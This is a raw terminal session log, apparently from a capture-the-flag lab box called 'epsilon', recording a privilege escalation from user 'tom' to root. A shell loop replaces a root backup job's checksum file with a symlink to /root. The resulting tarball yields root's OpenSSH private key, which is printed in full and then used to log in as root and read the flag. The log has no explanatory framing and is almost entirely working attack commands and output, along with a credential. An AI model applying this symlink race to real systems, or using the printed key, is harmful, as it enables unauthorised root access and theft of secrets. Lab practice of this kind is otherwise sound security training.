+-rw-r--r-- 1 root root 980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 3 root root 4.0K Apr 21 06:25 ..
+drwxr-xr-x 2 root root 4.0K Apr 21 11:06 .
+tom@epsilon:/var/backups/web_backups$ cp 978335760.tar 033913445.tar /tmp
+tom@epsilon:/var/backups/web_backups$ cd /tmp
+tom@epsilon:/tmp$ ls -lahr
+total 5.0M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 978335760.tar
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 13 root root 4.0K Apr 21 11:06 .
+tom@epsilon:/tmp$ tar -xf 978335760.tar
+tom@epsilon:/tmp$ ls -lahr
+total 5.0M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 11:07 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 978335760.tar
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 11:07 .
+tom@epsilon:/tmp$ cd /opt/
+tom@epsilon:/opt$ cd backups/
+tom@epsilon:/opt/backups$ ls -lahr
+total 8.0K
+drwxr-xr-x 4 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx 2 root root 4.0K Apr 21 11:07 .
+tom@epsilon:/opt/backups$ cd ../../
+tom@epsilon:/$ cd /tmp
+tom@epsilon:/tmp$ ls -lahr
+total 5.0M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 11:07 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 978335760.tar
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 11:07 .
+tom@epsilon:/tmp$ rm -rf opt/
+tom@epsilon:/tmp$ tar -xf 033913445.tar
+tom@epsilon:/tmp$ ls -lahr
+total 5.0M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 11:08 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 978335760.tar
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 11:08 .
+tom@epsilon:/tmp$ cd /opt/backups
+tom@epsilon:/opt/backups$ ls -lahr
+total 8.0K
+drwxr-xr-x 4 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx 2 root root 4.0K Apr 21 11:08 .
+tom@epsilon:/opt/backups$ cat checksum
+cat: checksum: No such file or directory
+tom@epsilon:/opt/backups$ cd ..
+tom@epsilon:/opt$ ls -lahr
+total 16K
+drwx--x--x  4 root root 4.0K Dec 20  2021 containerd
+drwxr-xrwx  2 root root 4.0K Apr 21 11:08 backups
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxr-xr-x  4 root root 4.0K Dec 20  2021 .
+tom@epsilon:/opt$ cat containerd/checksum
+cat: containerd/checksum: No such file or directory
+tom@epsilon:/opt$ rm *
+rm: cannot remove 'backups': Is a directory
+rm: cannot remove 'containerd': Is a directory
+tom@epsilon:/opt$ cd backups
+tom@epsilon:/opt/backups$ rm *
+rm: cannot remove '*': No such file or directory
+tom@epsilon:/opt/backups$ cd ..
+tom@epsilon:/opt$ ls -lahr
+total 16K
+drwx--x--x  4 root root 4.0K Dec 20  2021 containerd
+drwxr-xrwx  2 root root 4.0K Apr 21 11:09 backups
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxr-xr-x  4 root root 4.0K Dec 20  2021 .
+tom@epsilon:/opt$ cd ..
+tom@epsilon:/$ cd /opt/backups
+tom@epsilon:/opt/backups$ while :; do if test -f checksum; then rm -f checksum; ln -s /root checksum; echo "Replaced checksum"; sleep 5; echo "Backup probably done now"; break; fi; sleep 1; done
+Replaced checksum
+Backup probably done now
+tom@epsilon:/opt/backups$ cd /var/backups/web_backups
+tom@epsilon:/var/backups/web_backups$ ls -la
+total 82380
+drwxr-xr-x 2 root root     4096 Apr 21 11:14 .
+drwxr-xr-x 3 root root     4096 Apr 21 06:25 ..
+-rw-r--r-- 1 root root  1003520 Apr 21 11:10 126875674.tar
+-rw-r--r-- 1 root root  1003520 Apr 21 11:11 147946456.tar
+-rw-r--r-- 1 root root  1003520 Apr 21 11:12 173930705.tar
+-rw-r--r-- 1 root root  1003520 Apr 21 11:13 197144382.tar
+-rw-r--r-- 1 root root 80332800 Apr 21 11:14 221993984.tar
+tom@epsilon:/var/backups/web_backups$ cp 221993984.tar /tmp
+tom@epsilon:/var/backups/web_backups$ ls -lahr
+total 81M
+-rw-r--r-- 1 root root  77M Apr 21 11:14 221993984.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:13 197144382.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:12 173930705.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:11 147946456.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:10 126875674.tar
+drwxr-xr-x 3 root root 4.0K Apr 21 06:25 ..
+drwxr-xr-x 2 root root 4.0K Apr 21 11:14 .
+tom@epsilon:/var/backups/web_backups$ cd /tmp
+tom@epsilon:/tmp$ ls -lahr
+total 82M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 11:08 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 978335760.tar
+-rw-r--r--  1 tom  tom   77M Apr 21 11:14 221993984.tar
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 11:14 .
+tom@epsilon:/tmp$ rm -rf opt/
+tom@epsilon:/tmp$ tar -xf 221993984.tar
+tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted
+tar: Exiting with failure status due to previous errors
+tom@epsilon:/tmp$ ls -lahr
+total 82M
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .XIM-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .X11-unix
+drwx------  2 root root 4.0K Apr 20 23:52 vmware-root_656-2689274927
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .Test-unix
+drwx------  3 root root 4.0K Apr 21 04:33 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-upower.service-T0JUkg
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-timesyncd.service-V0V8Ph
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-resolved.service-Cuyumf
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-systemd-logind.service-mchjtj
+drwx------  3 root root 4.0K Apr 20 23:51 systemd-private-ae30ab56e8f9416dacddd7e6608eec17-apache2.service-hwdpyh
+-rwxrwxr-x  1 tom  tom   229 Apr 21 10:47 ssh_hijack.sh
+-rwxrwxr-x  1 tom  tom  3.0M Apr 21 10:08 pspy64
+drwxrwxr-x  3 tom  tom  4.0K Apr 21 11:15 opt
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .ICE-unix
+drwxrwxrwt  2 root root 4.0K Apr 20 23:51 .font-unix
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 978335760.tar
+-rw-r--r--  1 tom  tom   77M Apr 21 11:14 221993984.tar
+-rw-r--r--  1 tom  tom  980K Apr 21 11:06 033913445.tar
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxrwxrwt 14 root root 4.0K Apr 21 11:15 .
+tom@epsilon:/tmp$ cd /opt
+tom@epsilon:/opt$ ls -lah
+total 16K
+drwxr-xr-x  4 root root 4.0K Dec 20  2021 .
+drwxr-xr-x 19 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx  2 root root 4.0K Apr 21 11:15 backups
+drwx--x--x  4 root root 4.0K Dec 20  2021 containerd
+tom@epsilon:/opt$ cd backups
+tom@epsilon:/opt/backups$ ls -lahr
+total 984K
+-rw-r--r-- 1 root root   41 Apr 21 11:16 checksum
+-rw-r--r-- 1 root root 970K Apr 21 11:16 708250188.tar
+drwxr-xr-x 4 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx 2 root root 4.0K Apr 21 11:16 .
+tom@epsilon:/opt/backups$ cat checksum
+cat: checksum: No such file or directory
+tom@epsilon:/opt/backups$ ls -lahr
+total 8.0K
+drwxr-xr-x 4 root root 4.0K Dec 20  2021 ..
+drwxr-xrwx 2 root root 4.0K Apr 21 11:16 .
+tom@epsilon:/opt/backups$ cd
+tom@epsilon:~$ cd /opt/backups
+tom@epsilon:/opt/backups$ while :; do if test -f checksum; then rm -f checksum; ln -s /root checksum; echo "Replaced checksum"; sleep 5; echo "Backup probably done now"; break; fi; sleep 1; done
+Replaced checksum
+Backup probably done now
+tom@epsilon:/opt/backups$ cd /var/backups/web_backups
+tom@epsilon:/var/backups/web_backups$ ls -lahr
+total 80M
+-rw-r--r-- 1 root root  77M Apr 21 11:18 755863535.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:17 733430911.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:16 717187693.tar
+-rw-r--r-- 1 root root 980K Apr 21 11:15 695893783.tar
+drwxr-xr-x 3 root root 4.0K Apr 21 06:25 ..
+drwxr-xr-x 2 root root 4.0K Apr 21 11:18 .
+tom@epsilon:/var/backups/web_backups$ cp 755863535.tar /tmp
+tom@epsilon:/var/backups/web_backups$ cd /tmp
+tom@epsilon:/tmp$ mkdir 09880980
+tom@epsilon:/tmp$ cd 09880980/
+tom@epsilon:/tmp/09880980$ cp ../755863535.tar .
+tom@epsilon:/tmp/09880980$ mkdir 09203922e0f
+tom@epsilon:/tmp/09880980$ cd 09203922e0f/
+tom@epsilon:/tmp/09880980/09203922e0f$ cp ../755863535.tar .
+tom@epsilon:/tmp/09880980/09203922e0f$ ls -lahr
+total 77M
+-rw-r--r-- 1 tom tom  77M Apr 21 11:19 755863535.tar
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:19 ..
+drwxrwxr-x 2 tom tom 4.0K Apr 21 11:19 .
+tom@epsilon:/tmp/09880980/09203922e0f$ which python3
+/usr/bin/python3
+tom@epsilon:/tmp/09880980/09203922e0f$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+^C
+Keyboard interrupt received, exiting.
+tom@epsilon:/tmp/09880980/09203922e0f$ ls lahr
+ls: cannot access 'lahr': No such file or directory
+tom@epsilon:/tmp/09880980/09203922e0f$ ls -lahr
+total 77M
+-rw-r--r-- 1 tom tom  77M Apr 21 11:19 755863535.tar
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:19 ..
+drwxrwxr-x 2 tom tom 4.0K Apr 21 11:19 .
+tom@epsilon:/tmp/09880980/09203922e0f$ tar -xf 755863535.tar
+tar: opt/backups/checksum/.bash_history: Cannot mknod: Operation not permitted
+tar: Exiting with failure status due to previous errors
+tom@epsilon:/tmp/09880980/09203922e0f$ ls -lahr
+total 77M
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:22 opt
+-rw-r--r-- 1 tom tom  77M Apr 21 11:19 755863535.tar
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:19 ..
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:22 .
+tom@epsilon:/tmp/09880980/09203922e0f$ cd opt/backups
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups$ cat checksum
+cat: checksum: Is a directory
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups$ ls -lahr
+total 984K
+drwx------ 9 tom tom 4.0K Apr 20 23:51 checksum
+-rw-r--r-- 1 tom tom 970K Apr 21 11:18 743166385.tar
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:22 ..
+drwxrwxr-x 3 tom tom 4.0K Apr 21 11:22 .
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups$ cd checksum/
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups/checksum$ ls -lahr
+total 60K
+drwx------  2 tom tom 4.0K Dec 20  2021 .ssh
+drwxr-xr-x  2 tom tom 4.0K Dec 20  2021 src
+-rw-r-----  1 tom tom   33 Apr 20 23:51 root.txt
+-rw-r--r--  1 tom tom  161 Dec  5  2019 .profile
+drwxr-xr-x 36 tom tom 4.0K Apr 20 23:52 .localstack
+drwxr-xr-x  3 tom tom 4.0K Dec 20  2021 .local
+-rwxr-xr-x  1 tom tom  453 Nov 17  2021 lambda.sh
+-rw-r--r--  1 tom tom   33 Nov 17  2021 .gitconfig
+-rw-r--r--  1 tom tom  356 Nov 17  2021 docker-compose.yml
+drwxr-xr-x  3 tom tom 4.0K Dec 20  2021 .config
+drwx------  4 tom tom 4.0K Dec 20  2021 .cache
+-rw-r--r--  1 tom tom 3.1K Dec  5  2019 .bashrc
+drwxr-xr-x  2 tom tom 4.0K Dec 20  2021 .aws
+drwxrwxr-x  3 tom tom 4.0K Apr 21 11:22 ..
+drwx------  9 tom tom 4.0K Apr 20 23:51 .
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups/checksum$ cd .ssh
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups/checksum/.ssh$ ls -lahr
+total 20K
+-rw-r--r-- 1 tom tom  566 Dec  1  2021 id_rsa.pub
+-rw------- 1 tom tom 2.6K Dec  1  2021 id_rsa
+-rw------- 1 tom tom  566 Dec  1  2021 authorized_keys
+drwx------ 9 tom tom 4.0K Apr 20 23:51 ..
+drwx------ 2 tom tom 4.0K Dec 20  2021 .
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups/checksum/.ssh$ cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+tom@epsilon:/tmp/09880980/09203922e0f/opt/backups/checksum/.ssh$
+
+######################################################################
+
+
+~/hax0r1if3/epsilon ᐅ vim id_rsa
+~/hax0r1if3/epsilon ᐅ chmod 600 id_rsa
+~/hax0r1if3/epsilon ᐅ ssh root@10.10.11.134 -i id_rsa
+The authenticity of host '10.10.11.134 (10.10.11.134)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.134' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-97-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun 21 Apr 2024 11:24:49 AM UTC
+
+  System load:                      0.1
+  Usage of /:                       75.0% of 5.78GB
+  Memory usage:                     17%
+  Swap usage:                       0%
+  Processes:                        240
+  Users logged in:                  0
+  IPv4 address for br-a2acb156d694: 172.19.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for eth0:            10.10.11.134
+  IPv6 address for eth0:            dead:beef::250:56ff:feb9:a73d
+
+  => There are 2 zombie processes.
+
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Feb  7 01:51:07 2022
+root@epsilon:~# cat /root/root.txt
+8154d3b8ba7ccf4280e1371131f39989
